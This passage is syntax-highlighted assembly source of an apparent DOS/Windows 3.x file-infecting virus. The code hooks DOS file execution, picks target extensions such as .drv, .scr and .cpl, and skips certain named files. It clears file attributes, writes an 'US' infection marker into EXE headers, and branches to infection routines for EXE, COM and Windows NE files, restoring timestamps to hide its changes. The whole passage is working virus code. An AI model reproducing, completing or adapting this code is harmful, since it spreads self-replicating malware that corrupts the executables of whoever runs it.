                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ok_inf</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'OF'</span><span class="sc0">   </span><span class="sc1">; .fon and .fot</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ok_inf</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'RD'</span><span class="sc0">   </span><span class="sc1">; .drv</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ok_inf</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'CS'</span><span class="sc0">   </span><span class="sc1">; .scr</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ok_inf</span><span class="sc0">
</span><span class="sc1">;                cmp     word ptr ds:[di],'BV'   ; .vbx is too risky</span><span class="sc0">
</span><span class="sc1">;                je      ok_inf</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'PC'</span><span class="sc0">   </span><span class="sc1">; .cpl</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">go_away</span><span class="sc0">
</span><span class="sc5">ok_inf</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_it</span><span class="sc0">

</span><span class="sc5">go_away</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">

                </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">execution</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">tmpcounter</span><span class="sc4">],</span><span class="sc2">0b0h</span><span class="sc0">   </span><span class="sc1">; exec marker</span><span class="sc0">
</span><span class="sc5">infect_it</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">19h</span><span class="sc0">          </span><span class="sc1">; get current default drive</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">ok_drive</span><span class="sc0">        </span><span class="sc1">; don't infect on floppyes</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exit_at_all</span><span class="sc0">

</span><span class="sc5">ok_drive</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0"> 
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3524h</span><span class="sc0">          </span><span class="sc1">; get int24h seg and off</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">old_int24_off</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">  </span><span class="sc1">;store them</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">old_int24_seg</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int24h</span><span class="sc0">         </span><span class="sc1">; set our int24h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

</span><span class="sc5">check_name</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">

</span><span class="sc5">check_name_loop</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'.'</span><span class="sc0">    </span><span class="sc1">; search dot</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">got_namedot</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">    </span><span class="sc1">; end of filename?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">cn_int_loop</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">end_infection</span><span class="sc0">
</span><span class="sc5">cn_int_loop</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">check_name_loop</span><span class="sc0">
</span><span class="sc5">got_namedot</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">; is the extension dot?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">cn_int_loop</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">dontinfect</span><span class="sc0">           </span><span class="sc1">; point on noninfectables</span><span class="sc0">
</span><span class="sc5">check_av_loop</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">   </span><span class="sc1">; look each file</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">next_av</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">end_infection</span><span class="sc0">
</span><span class="sc5">next_av</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">    </span><span class="sc1">; end of the list?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">end_check</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">check_av_loop</span><span class="sc0">
</span><span class="sc5">end_check</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; Get attributes</span><span class="sc0">


                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_att</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">           </span><span class="sc1">; clear attributes</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_attributes</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">end_infection</span><span class="sc0">   </span><span class="sc1">; exit on error</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">              </span><span class="sc1">; save ds:dx to filename on stack</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">        </span><span class="sc1">; open in rw mode</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">end_infection_wfa</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; handle in bx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">        </span><span class="sc1">; get time/date</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">          </span><span class="sc1">; read a bounch of bytes</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">filebuffer</span><span class="sc0">   </span><span class="sc1">; to our buffer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc0">            </span><span class="sc1">; exe?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">isnotanexe</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0">          </span><span class="sc1">; really exe?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">isnotanexe</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc12">'US'</span><span class="sc0">       </span><span class="sc1">; exe marker?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">close_and_finish</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">],</span><span class="sc8">ch</span><span class="sc0">         </span><span class="sc1">; no overlays?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">close_and_finish</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">          </span><span class="sc1">; get lenght of the file</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seekfile</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">; ok if &gt; 64k</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">oklenght</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">800h</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">close_and_finish</span><span class="sc0">        </span><span class="sc1">; not ok if &lt; 5000</span><span class="sc0">

</span><span class="sc5">oklenght</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc12">'@'</span><span class="sc0">        </span><span class="sc1">; winexe?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">infect_winexe</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_exe</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_and_finish</span><span class="sc0">
</span><span class="sc5">isnotanexe</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">tmpcounter</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">    </span><span class="sc1">; Prevent ruining</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">close_and_finish</span><span class="sc0">                </span><span class="sc1">; files</span><span class="sc0">

                                </span><span class="sc1">; Infact we may have founded a file from</span><span class="sc0">
                                </span><span class="sc1">; another program that have the same</span><span class="sc0">
                                </span><span class="sc1">; extension as a windows part but of</span><span class="sc0">
                                </span><span class="sc1">; course it isn't a NewEXE. For example</span><span class="sc0">
                                </span><span class="sc1">; i saw some programs that have their</span><span class="sc0">
                                </span><span class="sc1">; files named as xxx.DRV and we don't</span><span class="sc0">
                                </span><span class="sc1">; want to destroy them :-)</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0e9h</span><span class="sc0">              </span><span class="sc1">; jmp?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">comtest</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'S'</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">close_and_finish</span><span class="sc0">
</span><span class="sc5">comtest</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_com</span><span class="sc0">

</span><span class="sc5">close_and_finish</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0157h</span><span class="sc0">        </span><span class="sc1">; restore time/date</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">          </span><span class="sc1">; close file</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">end_infection_wfa</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">              </span><span class="sc1">; ds:dx pointer to filename</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_att</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; attributes</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">end_infection</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_attributes</span><span class="sc0">  </span><span class="sc1">; put original attributes</span><span class="sc0">

</span><span class="sc5">end_infection</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_int24_seg</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_int24_off</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">; restore int24h</span><span class="sc0">
</span><span class="sc5">exit_at_all</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">tmpcounter</span><span class="sc4">],</span><span class="sc2">0b0h</span><span class="sc0">   </span><span class="sc1">; was executing?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">real_end</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">real_end</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">tmpcounter</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">do_int21h</span><span class="sc0">

</span><span class="sc5">infect_winexe</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">winexe_data</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; nexe header offset</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc12">'US'</span><span class="sc0"> </span><span class="sc1">; infection marker</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">],</span><span class="sc2">8</span><span class="sc0">    </span><span class="sc1">; enought room?</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3eh</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">close_and_finish</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">; seek to start</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seekfile</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; rewrite header</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">close_and_finish</span><span class="sc0">        </span><span class="sc1">; exit on error</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; to newexe header</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seekfile_mid_cx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                  </span><span class="sc1">; read NE header</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">36h</span><span class="sc4">],</span><span class="sc2">0802h</span><span class="sc0">  </span><span class="sc1">; only Win NewEXEs</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">bad_nexe</span><span class="sc0">                    </span><span class="sc1">; with gangload area</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc12">'EN'</span><span class="sc0">   </span><span class="sc1">; don't infect LE/PE</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ok_newexe</span><span class="sc0">

</span><span class="sc5">bad_nexe</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; start of file</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seekfile</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                  </span><span class="sc1">; reread exe hdr</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">],</span><span class="sc2">8</span><span class="sc0">  </span><span class="sc1">; restore changed data</span><span class="sc0">

